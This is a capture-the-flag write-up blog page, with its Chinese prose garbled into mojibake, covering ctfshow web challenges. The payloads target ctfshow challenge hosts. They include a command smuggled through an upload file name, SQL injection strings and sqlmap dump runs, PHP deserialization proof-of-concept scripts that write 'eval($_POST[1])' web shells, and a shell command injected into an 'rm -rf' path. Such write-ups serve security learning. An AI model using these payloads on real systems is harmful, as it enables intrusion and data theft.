<h2 id="LSBæ¢å§¬"><a href="#LSBæ¢å§¬" class="headerlink" title="LSBæ¢å§¬"></a>LSBæ¢å§¬</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://9d0e268f-d218-41f1-91ea-99cc3d6f0eac.challenge.ctf.show/&quot;</span><br><span class="line">files=&#123;&quot;file&quot;:(&quot;123;echo &#x27;Y2F0IGYqICA+IHN0YXRpYy9qcy9hbnNpX3VwLmpz&#x27;|base64 -d|sh&quot;,&quot;123&quot;,&quot;image/png&quot;)&#125;</span><br><span class="line">#cat f*  &gt; static/js/ansi_up.js</span><br><span class="line">requests.post(url+&#x27;upload&#x27;,files=files)</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url+&#x27;static/js/ansi_up.js&#x27;)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#åˆå§‹åŒ–å…¨å±€å˜é‡</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>

<h2 id="æ— ä¸€å¹¸å…-FIXED"><a href="#æ— ä¸€å¹¸å…-FIXED" class="headerlink" title="æ— ä¸€å¹¸å…_FIXED"></a>æ— ä¸€å¹¸å…_FIXED</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class="line">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class="line">    if ($arr[]=1)&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ•´å½¢æ•°ç»„æº¢å‡º</p>
<p><a href="https://blog.csdn.net/Win_X_/article/details/117579314">(10æ¡æ¶ˆæ¯) PHP_æ•°ç»„æº¢å‡ºåˆ†æ_php æ•°ç»„æº¢å‡º_WinX_çš„åšå®¢-CSDNåšå®¢</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=9223372036854775807</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowä»£ç å®¡è®¡</title>
    <url>/2023/03/16/ctfshow%E5%90%88%E9%9B%86-ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>ä»£ç å®¡è®¡</p>
  <span id="more"></span>


<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment">//åœ¨ PHP ä¸­ï¼Œæœ‰ä¸¤ç§å¸¸ç”¨æ¥å£ç”¨äºè¿æ¥ MySQL æ•°æ®åº“å¹¶ä¸ä¹‹äº¤äº’ï¼š`mysqli`å’Œ`PDO`.</span></span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æºç ä¸‹è½½åœ°å€<a href="https://ctfshow.lanzoui.com/ilMPgjfeyxa">https://ctfshow.lanzoui.com/ilMPgjfeyxa</a></p>
<p>ä½¿ç”¨<code>mysqli</code>ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œæ‰€æœ‰å¸¸è§çš„æ•°æ®åº“æ“ä½œï¼Œä¾‹å¦‚æŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°å’Œåˆ é™¤æ•°æ®ã€‚</p>
<p>è§£æ³•ä¸€payloadï¼š</p>
<p>1â€™ union select 1# â€˜;</p>
<p>1ï¼›åŸç†å¦‚ä¸‹</p>
<p><a href="https://blog.csdn.net/q20010619/article/details/120592532">(10æ¡æ¶ˆæ¯) CTFshowåˆ·é¢˜æ—¥è®°-WEB-ä»£ç å®¡è®¡(web301-310)SQLæ³¨å…¥ã€SSRFæ‰“MySQLã€SSRFæ‰“FastCGIã€SSRFæ–‡ä»¶è¯»å–_ctfshow web303_OceanSecçš„åšå®¢-CSDNåšå®¢</a></p>
<p>è§£æ³•äºŒsqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --dump --forms --batch</span><br></pre></td></tr></table></figure>

<p>  checklogin.php æºç å¦‚ä¸‹ï¼Œèƒ½è·‘ä½†åªèƒ½è·‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username=$_POST[&#x27;userid&#x27;];</span><br><span class="line">$userpwd=$_POST[&#x27;userpwd&#x27;];</span><br><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>forms é€‰æ‹©post ä¼ å‚ï¼Œbatché€‰æ‹©è‡ªåŠ¨yes</p>
<p>ç”±äºä¸Šé¢è·‘çš„å¤ªæ…¢ä¹Ÿå¯ä»¥é€‰æ‹©sql 6è¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --current-db</span><br><span class="line">//è·‘å‡ºæ•°æ®åº“sds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --tables -D &quot;sds&quot;</span><br><span class="line">//è·‘å‡ºè¡¨ sds_user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --columns  -T &quot;sds_user&quot; -D &quot;sds&quot;   </span><br></pre></td></tr></table></figure>

<p> è·‘å‡ºå­—æ®µ</p>
<p>sds_password<br> sds_username </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://f922feab-0cee-4250-bf07-c4fe567b6974.challenge.ctf.show/checklogin.php --forms --batch --dump  -T &quot;sds_user&quot; -D &quot;sds&quot; -C &quot;sds_password&quot; </span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºå¯†ç ï¼šctfshowwwww    ç™»é™†å³å¯</p>
<p>è§£æ³•ä¸‰</p>
<p>username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;#</span><br></pre></td></tr></table></figure>

<p>passwd&#x3D;1</p>
<p>è®¿é—®url&#x2F;1.php </p>
<p>èšå‰‘è¿æ¥</p>
<p><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376?ops_request_misc=%7B%22request_id%22:%22167894875516800225569050%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167894875516800225569050&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-73437376-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=$_SESSION&spm=1018.2226.3001.4187">(10æ¡æ¶ˆæ¯) phpä¹‹$_SESSIONçš„ç†è§£_php $_session_å‹ç¼˜èšå‹çš„åšå®¢-CSDNåšå®¢</a></p>
<p>ctfshow{7623027b-8b89-4757-8f8f-5f10d6a87c1b}</p>
<h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½åæºç åwpä¸ç¬¦ï¼ŒæŒ‰wpçš„æ¥</p>
<p>ç™»å½•æ—¶åˆ¤æ–­äº†è¢« sds_decode() å¤„ç†åçš„å¯†ç æ˜¯å¦å’ŒæŸ¥è¯¢å‡ºæ¥çš„å¯†ç ä¸€è‡´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢˜è§£æ³•ä¸€ç”¨ä¸äº†äº†</p>
<p>å¯ä»¥</p>
<p>ä¸Šé¢˜payloadå†™shellä¾æ—§èƒ½ç”¨</p>
<p>ctfshow{b85b90e6-b5cc-46c1-93e2-1c421de498a0}</p>
<h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>åœ¨sqlæŸ¥è¯¢ä¹‹å‰åŠ å…¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†è¯•äº†è¯•ï¼Œadmin,adminå³å¯è¿›å…¥ã€‚</p>
<p>å®¡è®¡æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//æ³¨å…¥ç‚¹</span></span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$dpt_name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_address</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_build_year</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_has_cert</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]==<span class="string">&quot;on&quot;</span>?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">	<span class="variable">$dpt_cert_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_telephone_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:dpt.php&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶éƒ½è¯´æ˜¯æ³¨å…¥ç‚¹äº†ï¼Œæ³¨å…¥ä¸€ä¸‹è¯•è¯•ã€‚</p>
<h2 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h2><p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ç‚¹åœ¨checklogin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line">	<span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–å†™è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u, $p)&#123;</span><br><span class="line">        $this-&gt;username = $u;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new user(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($s));</span><br></pre></td></tr></table></figure>

<p>run</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥æ•°æ®åº“ï¼Œ</p>
<p>æ•°æ®åº“åœ°å€ï¼šlocahost:3306</p>
<p>ç”¨æˆ·å¯†ç  root root ,æ–‡ä»¶ä¸‹è½½åå¯†ç æ˜¯phpcj,è¿™ä¸ªæ˜¯é”™çš„ï¼Œåº”è¯¥è¿˜æ²¡æ¥å¾—åŠæ”¹</p>
<p>æ‰“å¼€ååœ¨sdsåº“é‡Œçœ‹è§flag</p>
<h2 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h2><p>æ‰¾åˆ°å†™æ–‡ä»¶å‡½æ•°ï¼Œç»§ç»­æ‰¾è°ƒç”¨close()å‡½æ•°çš„ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class log&#123;</span><br><span class="line">	public $title=&#x27;log.txt&#x27;;</span><br><span class="line">	public $info=&#x27;&#x27;;</span><br><span class="line">	public function loginfo($info)&#123;</span><br><span class="line">		$this-&gt;info=$this-&gt;info.$info;</span><br><span class="line">	&#125;</span><br><span class="line">	public function close()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç±»é‡Œé¢è¿˜å«æœ‰å¯è°ƒç”¨çš„__construct()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	private $conn;</span><br><span class="line"></span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">		$this-&gt;init();</span><br><span class="line">	&#125;</span><br><span class="line">	private function init()&#123;</span><br><span class="line">		$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;conn-&gt;close();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>search unserialize</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = unserialize(base64_decode($_COOKIE[&#x27;user&#x27;]));</span><br><span class="line">if($user)&#123;</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>pocè„šæœ¬ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $conn;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;conn=new log();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class log&#123;</span><br><span class="line">    public $title=&#x27;a.php&#x27;;</span><br><span class="line">    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>cookieä¼ å‚åˆ°index.php</p>
<p>è®¿é—®a.phpå³å¯</p>
<h2 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h2><p>search file_put_contents</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function closelog()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœåˆ°closelog</p>
<p>æ‰€ä»¥ç”¨ä¸äº†ï¼Œæ¢å‘½ä»¤æ‰§è¡Œå¹»æœ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°äº†shell_execï¼Œåœ¨dao.phpä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function  clearCache()&#123;</span><br><span class="line">		shell_exec(&#x27;rm -rf ./&#x27;.$this-&gt;config-&gt;cache_dir.&#x27;/*&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢ä¸€ä¸‹clearCacheï¼Œåœ¨service.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearCache()&#123;</span><br><span class="line">	$this-&gt;dao-&gt;clearCache();</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°åœ¨logout.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">	$service-&gt;clearCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d8c4084b-f6f8-423c-b148-752d4b81eef8.challenge.ctf.show/controller/logout.php</span><br></pre></td></tr></table></figure>

<p>æˆ‘è¯•äº†è¯•ç«ç‹çš„hackbarä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œcookieä¼ å‚ç©¿äº†å¥½ä¹…éƒ½æ²¡è¿›å»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">    public $cache_dir = &#x27;;echo \&#x27;&lt;?php eval($_POST[1]);?&gt;\&#x27; &gt; 1.php;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>åŒæ ·ç”Ÿæˆçš„1.phpä¹Ÿåœ¨controllerä¸‹</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDE6IjtlY2hvICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure>

<p>ctfshow{b1869c93-377b-4431-8257-c7475286bb2e}</p>
